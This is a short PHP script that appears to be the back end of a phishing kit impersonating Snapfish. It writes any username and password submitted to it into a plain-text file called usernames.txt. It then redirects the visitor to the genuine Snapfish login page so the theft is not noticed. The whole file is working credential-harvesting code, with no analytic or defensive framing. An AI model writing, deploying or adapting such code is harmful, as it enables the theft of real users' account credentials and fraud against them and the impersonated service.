<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.snapfish.com/loginto?next=https%3A%2F%2Fwww.snapfish.com%2Fhome');
exit();
